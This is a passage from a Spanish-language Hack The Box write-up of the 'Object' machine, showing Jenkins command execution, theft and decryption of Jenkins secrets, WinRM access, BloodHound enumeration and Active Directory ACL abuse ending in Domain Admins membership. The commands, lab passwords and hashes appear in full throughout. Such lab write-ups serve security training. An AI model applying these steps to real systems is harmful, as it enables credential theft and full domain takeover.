sistema\\n\\n![](/Object/Pasted_image_20220620182550.png)\\n\\n## Vulnerabilities analysis\\n\\nLa siguiente página nos indica que es posible ejecutar comandos en el sistema mediante la creación de builds\\n\\nhttps://book.hacktricks.xyz/cloud-security/jenkins\\n\\nCreamos un nuevo proyecto \\n\\nVamos a la sección de triggers\\n\\nY configuramos lo siguiente\\n\\n![](/Object/Pasted_image_20220621071436.png)\\n\\nEsto lo hacemos para que se ejecute el Build donde ingresaremos nuestro comando\\n\\nEn Build presionamos sobre el botón Add build step y seleccionamos Execute Windows batch command. Luego, agregamos lo siguiente:\\n\\n![](/Object/Pasted_image_20220621071556.png)\\n\\nEsperamos unos minutos y vemos el resultado\\n\\n![](/Object/Pasted_image_20220621071328.png)\\n\\nEl software está ejecutandose como el usuario oliver\\n\\n# Explotation\\n\\nIntentaremos verificar que el sistema no tiene habilitado algun firewall\\n\\n![](/Object/Pasted_image_20220621072459.png)\\n\\nCon python creamos un servidor http a la esucha y vemos si es posible la conexión\\n\\n![](/Object/Pasted_image_20220621072512.png)\\n\\nComenzamos a enumera el sistema y extraer alguna información que nos sea util \\n\\nEnumeramos los directorios\\n\\n![](/Object/Pasted_image_20220621073347.png)\\n\\nLuego consultamos el directorio C:\\\\Users\\\\oliver\\\\AppData\\\\Local\\\\Jenkins\\\\.jenkins\\n\\n![](/Object/Pasted_image_20220621073716.png)\\n\\nSegún el siguiente sitio: https://stackoverflow.com/questions/52930545/what-is-the-purpose-of-the-jenkins-user-folder-and-what-are-these-config-files\\n\\nEl archivo config.xml del directorio users contiene información de los usuarios del sistema. Por lo que intentaremos acceder al contenido del archivo.\\n\\nC:\\\\Users\\\\oliver\\\\AppData\\\\Local\\\\Jenkins\\\\.jenkins\\\\users\\\\leftraro_9491939160013366012\\\\config.xml\\n\\n~~~xml\\n<?xml version='1.1' encoding='UTF-8'?>\\n<user>\\n  <version>10</version>\\n  <id>leftraro</id>\\n  <fullName>leftraro</fullName>\\n  <properties>\\n    <jenkins.security.ApiTokenProperty>\\n      <tokenStore>\\n        <tokenList/>\\n      </tokenStore>\\n    </jenkins.security.ApiTokenProperty>\\n    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin=\\\"credentials@2.6.1\\\">\\n      <domainCredentialsMap class=\\\"hudson.util.CopyOnWriteMap$Hash\\\"/>\\n    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>\\n    <hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin=\\\"email-ext@2.84\\\">\\n      <triggers/>\\n    </hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty>\\n    <hudson.model.MyViewsProperty>\\n      <views>\\n        <hudson.model.AllView>\\n          <owner class=\\\"hudson.model.MyViewsProperty\\\" reference=\\\"../../..\\\"/>\\n          <name>all</name>\\n          <filterExecutors>false</filterExecutors>\\n          <filterQueue>false</filterQueue>\\n          <properties class=\\\"hudson.model.View$PropertyList\\\"/>\\n        </hudson.model.AllView>\\n      </views>\\n    </hudson.model.MyViewsProperty>\\n    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin=\\\"display-url-api@2.3.5\\\">\\n      <providerId>default</providerId>\\n    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>\\n    <hudson.model.PaneStatusProperties>\\n      <collapsed/>\\n    </hudson.model.PaneStatusProperties>\\n    <jenkins.security.seed.UserSeedProperty>\\n      <seed>0a9baf906da7ec2b</seed>\\n    </jenkins.security.seed.UserSeedProperty>\\n    <hudson.search.UserSearchProperty>\\n      <insensitiveSearch>true</insensitiveSearch>\\n    </hudson.search.UserSearchProperty>\\n    <hudson.model.TimeZoneProperty/>\\n    <hudson.security.HudsonPrivateSecurityRealm_-Details>\\n      <passwordHash>#jbcrypt:$2a$10$Y4W8YbX0jiPJDGgfKcnhauOpdZ84NoaZeI/HP76dSqxQTxzShlHqO</passwordHash>\\n    </hudson.security.HudsonPrivateSecurityRealm_-Details>\\n    <hudson.tasks.Mailer_-UserProperty plugin=\\\"mailer@1.34\\\">\\n      <emailAddress>leftraro@asdas.cl</emailAddress>\\n    </hudson.tasks.Mailer_-UserProperty>\\n    <jenkins.security.LastGrantedAuthoritiesProperty>\\n      <roles>\\n        <string>authenticated</string>\\n      </roles>\\n      <timestamp>1655809043400</timestamp>\\n    </jenkins.security.LastGrantedAuthoritiesProperty>\\n  </properties>\\n</user>\\n~~~\\n\\nLuego consultamos el del usuario admin\\n\\ntype C:\\\\Users\\\\oliver\\\\AppData\\\\Local\\\\Jenkins\\\\.jenkins\\\\users\\\\\\n\\n~~~xml\\n<?xml version='1.1' encoding='UTF-8'?>\\n<user>\\n  <version>10</version>\\n  <id>admin</id>\\n  <fullName>admin</fullName>\\n  <properties>\\n    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin=\\\"credentials@2.6.1\\\">\\n      <domainCredentialsMap class=\\\"hudson.util.CopyOnWriteMap$Hash\\\">\\n        <entry>\\n          <com.cloudbees.plugins.credentials.domains.Domain>\\n            <specifications/>\\n          </com.cloudbees.plugins.credentials.domains.Domain>\\n          <java.util.concurrent.CopyOnWriteArrayList>\\n            <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>\\n              <id>320a60b9-1e5c-4399-8afe-44466c9cde9e</id>\\n              <description></description>\\n              <username>oliver</username>\\n              <password>{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}</password>\\n              <usernameSecret>false</usernameSecret>\\n            </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>\\n          </java.util.concurrent.CopyOnWriteArrayList>\\n        </entry>\\n      </domainCredentialsMap>\\n    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>\\n    <hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin=\\\"email-ext@2.84\\\">\\n      <triggers/>\\n    </hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty>\\n    <hudson.model.MyViewsProperty>\\n      <views>\\n        <hudson.model.AllView>\\n          <owner class=\\\"hudson.model.MyViewsProperty\\\" reference=\\\"../../..\\\"/>\\n          <name>all</name>\\n          <filterExecutors>false</filterExecutors>\\n          <filterQueue>false</filterQueue>\\n          <properties class=\\\"hudson.model.View$PropertyList\\\"/>\\n        </hudson.model.AllView>\\n      </views>\\n    </hudson.model.MyViewsProperty>\\n    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin=\\\"display-url-api@2.3.5\\\">\\n      <providerId>default</providerId>\\n    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>\\n    <hudson.model.PaneStatusProperties>\\n      <collapsed/>\\n    </hudson.model.PaneStatusProperties>\\n    <jenkins.security.seed.UserSeedProperty>\\n      <seed>ea75b5bd80e4763e</seed>\\n    </jenkins.security.seed.UserSeedProperty>\\n    <hudson.search.UserSearchProperty>\\n      <insensitiveSearch>true</insensitiveSearch>\\n    </hudson.search.UserSearchProperty>\\n    <hudson.model.TimeZoneProperty/>\\n    <hudson.security.HudsonPrivateSecurityRealm_-Details>\\n      <passwordHash>#jbcrypt:$2a$10$q17aCNxgciQt8S246U4ZauOccOY7wlkDih9b/0j4IVjZsdjUNAPoW</passwordHash>\\n    </hudson.security.HudsonPrivateSecurityRealm_-Details>\\n    <hudson.tasks.Mailer_-UserProperty plugin=\\\"mailer@1.34\\\">\\n      <emailAddress>admin@object.local</emailAddress>\\n    </hudson.tasks.Mailer_-UserProperty>\\n    <jenkins.security.ApiTokenProperty>\\n      <tokenStore>\\n        <tokenList/>\\n      </tokenStore>\\n    </jenkins.security.ApiTokenProperty>\\n    <jenkins.security.LastGrantedAuthoritiesProperty>\\n      <roles>\\n        <string>authenticated</string>\\n      </roles>\\n      <timestamp>1634793332195</timestamp>\\n    </jenkins.security.LastGrantedAuthoritiesProperty>\\n  </properties>\\n</user>\\n~~~\\n\\nPara extraer las contraseñas podemos utilizar el siguiente script en python\\n\\n\\nDebemos descargar dos archivos \\n\\n- master.key \\n- hudson.util.Secret\\n\\nComo este ultimo es un binario, lo convertiremos a base64 y luego lo decodificaremos y guardaremos en nuestro sistema:\\n\\n~~~\\npowershell -c [convert]::ToBase64String((cat C:\\\\Users\\\\oliver\\\\AppData\\\\Local\\\\Jenkins\\\\.jenkins\\\\secrets\\\\hudson.util.Secret -Encoding byte))\\n~~~\\n\\nhudson.util.Secret\\n\\n~~~\\ngWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=\\n~~~\\n\\nmaster.key\\n\\n~~~\\nZjY3M2ZkYjBjNGZjYzMzOTA3MDQzNWJkYmUxYTAzOWQ4M2E1OTdiZjIxZWFmYmI3ZjliMzViNTBmY2UwMDZlNTY0Y2ZmNDU2NTUzZWQ3M2NiMWZhNTY4YjY4YjMxMGFkZGM1NzZmMTYzN2E3ZmU3MzQxNGE0YzZmZjEwYjRlMjNhZGM1MzhlOWIzNjlhMGM2ZGU4ZmMyOTlkZmEyYTM5MDRlYzczYTI0YWE0ODU1MGIyNzZiZTUxZjkxNjU2Nzk1OTViMmNhYzAzY2MyMDQ0ZjNjNzAyZDY3NzE2OWUyZjRkM2JkOTZkODMyMWEyZTE5ZTJiZjBjNzZmZTMxZGIxOQ==\\n~~~\\n\\nDescodificamos los archivo y ejecutamos el script:\\n\\n~~~bash\\npython decrypt.py master.key hudson.util.Secret config.xml\\nc1cdfun_d2434\\n~~~\\n\\n## Getting a shell\\n\\nAhora con las credenciales del usuario oliver podemos usar el servicio WinRM\\n\\n- User: oliver\\n- Password: c1cdfun_d2434\\n\\n~~~ bash\\nevil-winrm -i 10.129.90.135 -u oliver -p c1cdfun_d2434\\n\\nEvil-WinRM shell v3.3\\n\\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\\n\\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\\n\\nInfo: Establishing connection to remote endpoint\\n\\n*Evil-WinRM* PS C:\\\\Users\\\\oliver\\\\Documents> whoami\\nobject\\\\oliver\\n*Evil-WinRM* PS C:\\\\Users\\\\oliver\\\\Documents> \\n\\n~~~\\n\\n## System Enumeration\\n\\nUsuarios del sistema\\n\\n~~~ bash\\n*Evil-WinRM* PS C:\\\\Users> ls\\n\\n\\n    Directory: C:\\\\Users\\n\\n\\nMode                LastWriteTime         Length Name\\n----                -------------         ------ ----\\nd-----       11/10/2021   3:20 AM                Administrator\\nd-----       10/26/2021   7:59 AM                maria\\nd-----       10/26/2021   7:58 AM                oliver\\nd-r---        4/10/2020  10:49 AM                Public\\nd-----       10/21/2021   3:44 AM                smith\\n\\n~~~\\n\\nServicios que esten a la esucha en algun puerto\\n\\n~~~bash\\n*Evil-WinRM* PS C:\\\\Users> netstat -ano | findstr LISTENING\\n  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4\\n  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       900\\n  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4\\n  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       900\\n  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4\\n  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       5644\\n  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2796\\n  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4\\n  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       484\\n  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1160\\n  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1520\\n  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:49684          0.0.0.0:0              LISTENING       628\\n  TCP    0.0.0.0:49695          0.0.0.0:0              LISTENING       2928\\n  TCP    0.0.0.0:62258          0.0.0.0:0              LISTENING       2872\\n  TCP    10.129.90.135:53       0.0.0.0:0              LISTENING       2928\\n  TCP    10.129.90.135:139      0.0.0.0:0              LISTENING       4\\n  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2928\\n  TCP    [::]:80                [::]:0                 LISTENING       4\\n  TCP    [::]:88                [::]:0                 LISTENING       648\\n  TCP    [::]:135               [::]:0                 LISTENING       900\\n  TCP    [::]:389               [::]:0                 LISTENING       648\\n  TCP    [::]:445               [::]:0                 LISTENING       4\\n  TCP    [::]:464               [::]:0                 LISTENING       648\\n  TCP    [::]:593               [::]:0                 LISTENING       900\\n  TCP    [::]:636               [::]:0                 LISTENING       648\\n  TCP    [::]:3268              [::]:0                 LISTENING       648\\n  TCP    [::]:3269              [::]:0                 LISTENING       648\\n  TCP    [::]:5985              [::]:0                 LISTENING       4\\n  TCP    [::]:8080              [::]:0                 LISTENING       5644\\n  TCP    [::]:9389              [::]:0                 LISTENING       2796\\n  TCP    [::]:47001             [::]:0                 LISTENING       4\\n  TCP    [::]:49664             [::]:0                 LISTENING       484\\n  TCP    [::]:49665             [::]:0                 LISTENING       1160\\n  TCP    [::]:49666             [::]:0                 LISTENING       1520\\n  TCP    [::]:49667             [::]:0                 LISTENING       648\\n  TCP    [::]:49673             [::]:0                 LISTENING       648\\n  TCP    [::]:49674             [::]:0                 LISTENING       648\\n  TCP    [::]:49684             [::]:0                 LISTENING       628\\n  TCP    [::]:49695             [::]:0                 LISTENING       2928\\n  TCP    [::]:62258             [::]:0                 LISTENING       2872\\n  TCP    [::1]:53               [::]:0                 LISTENING       2928\\n  TCP    [dead:beef::84]:53     [::]:0                 LISTENING       2928\\n  TCP    [dead:beef::eddf:29ac:70d6:2b4b]:53  [::]:0                 LISTENING       2928\\n  TCP    [fe80::eddf:29ac:70d6:2b4b%12]:53  [::]:0                 LISTENING       2928\\n\\n~~~\\n\\nAl parecer es una Servidor Active Directory\\n\\nSubimos el archivo SharpHound.ps1 para buscar vectores de ataque:\\n\\n~~~bash\\nPS C:\\\\Users\\\\oliver\\\\Desktop> upload /home/kali/HTB/machines/res/SharpHound.ps1\\nInfo: Uploading /home/kali/HTB/machines/res/SharpHound.ps1 to C:\\\\Users\\\\oliver\\\\Desktop\\\\SharpHound.ps1\\n\\n                                                             \\nData: 1298980 bytes of 1298980 bytes copied\\n\\nInfo: Upload successful!\\n\\n~~~\\n\\nLuego lo ejecutamos:\\n\\n~~~bash\\n. .\\\\SharpHound.ps1\\nInvoke-BloodHound -CollectionMethod All\\n~~~\\n\\nRevisamos loa archivos creados\\n\\n~~~bash\\nls\\n\\n\\n    Directory: C:\\\\Users\\\\oliver\\\\desktop\\n\\n\\nMode                LastWriteTime         Length Name\\n----                -------------         ------ ----\\n-a----        6/21/2022   6:40 AM           9060 20220621064046_BloodHound.zip\\n-a----        6/21/2022   6:40 AM          10043 MWU2MmE0MDctMjBkZi00N2VjLTliOTMtYThjYTY4MjdhZDA2.bin\\n-a----        6/21/2022   6:35 AM         974235 SharpHound.ps1\\n-ar---        6/21/2022   4:56 AM             34 user.txt\\n\\n~~~\\n\\nDescargamos el archivo .zip\\n\\n## Elevación de privilegios\\n\\nLo importamos en bloodhound y luego buscamos el path mas corto para llegar a admin\\n\\n![](/Object/Pasted_image_20220621111052.png)\\n\\n- Desde oliver a smith forcechangepassword\\n- Desde smith a maria GenericWrite\\n- Desde maria a Administrador WriteOwner\\n\\nPara entender como explotar el cambio de contraseña para el usuario smith presionamos click derecho sobre ForceChangePassword\\n\\n![](/Object/Pasted_image_20220621111719.png)\\n\\n![](/Object/Pasted_image_20220621111731.png)\\n\\n## Consiguiendo el usuario Smith \\n\\nNos sugiere instalar powerview y hacer el cambio de contraseña con esta herramienta:\\n\\n~~~powershell\\n . .\\\\powerview.ps1\\n~~~\\nLuego ejecutamos los siguientes comandos:\\n\\n~~~powershell\\n$newpass = ConvertTo-SecureString 'Password1234#' -AsPlainText -Force\\n~~~\\n\\n~~~powershell\\nSet-DomainUserPassword -Identity smith -AccountPassword $newpass\\n~~~\\n\\nAhora el usuario smith posee las siguientes credenciales\\n\\n- User: smith\\n- Password: Password1234#\\n\\nVerificamos si tenemos acceso al sistema mediante WinRM con el usuario smith\\n\\n~~~powershell\\nevil-winrm -i 10.129.90.135 -u smith -p 'Password1234#'                            \\n\\nEvil-WinRM shell v3.3\\n\\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\\n\\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\\n\\nInfo: Establishing connection to remote endpoint\\n\\n*Evil-WinRM* PS C:\\\\Users\\\\smith\\\\Documents> \\n~~~\\n\\n## Consiguiendo el usuario Maria\\n\\nPara conseguir acceso al usuario maria, Bloodhound nos sugiere utilizar nuevamente el modulo powerview.ps1 junto con sus componentes Set-DomainObject y Get-DomainSPNTicket\\n\\nSin embargo, el ataque no fue exitoso, Hacktricks sugiere que se puede usar el GenericWrite para modificar los script de logon.\\n\\nhttps://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse#genericwrite-on-user\\n\\nPor lo que usamos los siguientes comandos\\n\\n~~~powershell \\necho \\\"ls \\\\users\\\\maria > c:\\\\tmp\\\\out\\\" > cmd.ps1\\n~~~\\n\\n~~~powershell\\nSet-DomainObject -Identity maria -SET @{scriptpath=\\\"C:\\\\\\\\tmp\\\\\\\\cmd.ps1\\\"}\\n~~~\\n\\nLuego leemos el archivo out y vemos lo siguiente\\n\\n~~~powershell\\ntype out\\n\\n\\n    Directory: C:\\\\users\\\\maria\\n\\n\\nMode                LastWriteTime         Length Name\\n----                -------------         ------ ----\\nd-r---       10/22/2021   3:54 AM                3D Objects\\nd-r---       10/22/2021   3:54 AM                Contacts\\nd-r---       10/25/2021   3:47 AM                Desktop\\nd-r---       10/25/2021  10:07 PM                Documents\\nd-r---       10/22/2021   3:54 AM                Downloads\\nd-r---       10/22/2021   3:54 AM                Favorites\\nd-r---       10/22/2021   3:54 AM                Links\\nd-r---       10/22/2021   3:54 AM                Music\\nd-r---       10/22/2021   3:54 AM                PictuObject\\nd-r---       10/22/2021   3:54 AM                Saved Games\\nd-r---       10/22/2021   3:54 AM                Searches\\nd-r---       10/22/2021   3:54 AM                Videos\\n~~~\\n\\nNotamos que el directorio Documents ha sifo modificado recientemente\\n\\n~~~powershell\\necho \\\"ls \\\\users\\\\maria\\\\desktop > \\\\tmp\\\\out \\\" > cmd.ps1\\n~~~\\n \\n Y conseguimos el siguiente archivo\\n \\n~~~powershell\\ncat out\\n\\nDirectory: C:\\\\users\\\\maria\\\\desktop\\n\\n\\nMode                LastWriteTime         Length Name\\n----                -------------         ------ ----\\n-a----       10/26/2021   8:13 AM           6144 Engines.xls\\n\\n ~~~\\n\\nModificamos el archivo cmd.ps1:\\n\\n~~~powershell\\necho \\\"copy \\\\users\\\\maria\\\\desktop\\\\Engines.xls  \\\\tmp\\\\ \\\" > cmd.ps1\\n~~~\\n\\n\\n~~~powershell\\nls\\n\\n\\n    Directory: C:\\\\tmp\\n\\n\\nMode                LastWriteTime         Length Name\\n----                -------------         ------ ----\\n-a----        6/21/2022   8:03 AM             96 cmd.ps1\\n-a----       10/26/2021   8:13 AM           6144 Engines.xls\\n-a----        6/21/2022   8:02 AM            830 out\\n-a----        6/21/2022   7:59 AM            830 out2\\n\\n~~~\\n\\n\\nDescargamos el archivo a nuestra VM. Luego convertimos el archivo a csv\\n\\n~~~bash\\nssconvert Engines.xls engine.csv\\n~~~\\n\\nY vemos su contenido\\n\\n~~~bash\\ncat engine.csv                           \\n\\\"Machines Information\\\",,,,,\\nName,Quantity,\\\"Date Acquired\\\",Owner,\\\"Chamber Username\\\",\\\"Chamber Password\\\"\\n\\\"Internal Combustion Engine\\\",12,2021/10/02,HTB,maria,d34gb8@\\n\\\"Stirling Engine\\\",23,2021/11/05,HTB,maria,0de_434_d545\\n\\\"Diesel Engine\\\",4,2021/02/03,HTB,maria,W3llcr4ft3d_4cls\\n~~~\\n\\nIntentamos acceder al sistema mediante WinRM como el usuario maria utilizando las contraseñas indicadas en el CSV\\n\\n## Administrador\\n\\nBloodHound nuevamente nos sugiere instalar el modulo PowerView para luego modificar  el grupo de administradores y hacer que maria sea parte de este grupo\\n\\nDefinimos a maria como el dueño del grupo Domain Admins\\n\\n~~~powershell\\nSet-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria'\\n~~~\\n\\nAsiganmos todos los derechos del grupo a maria\\n\\n~~~powershell\\nAdd-DomainObjectAcl -TargetIdentity \\\"Domain Admins\\\" -PrincipalIdentity maria -Rights All\\n~~~\\n\\nAgregamos a maria al grupo Domain Admins\\n\\n~~~powershell\\nAdd-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'\\n~~~\\n\\nVerificamos a que grupos pertenece maria\\n\\n~~~powershell\\n*Evil-WinRM* PS C:\\\\Users\\\\maria\\\\Documents> net user maria\\nUser name                    maria\\nFull Name                    maria garcia\\nComment\\nUser's comment\\nCountry/region code          000 (System Default)\\nAccount active               Yes\\nAccount expires              Never\\n\\nPassword last set            10/21/2021 9:16:32 PM\\nPassword expires             Never\\nPassword changeable          10/22/2021 9:16:32 PM\\nPassword required            Yes\\nUser may change password     Yes\\n\\nWorkstations allowed         All\\nLogon script                 C:\\\\\\\\tmp\\\\\\\\cmd.ps1\\nUser profile\\nHome directory\\nLast logon                   6/21/2022 4:56:41 AM\\n\\nLogon hours allowed          All\\n\\nLocal Group Memberships      *Remote Management Use\\nGlobal Group memberships     *Domain Admins        *Domain Users\\nThe command completed successfully.\\n~~~\\n\\nFinalmente tenemos acceso como Administrador al sistema\"}"},"__N_SSG":true}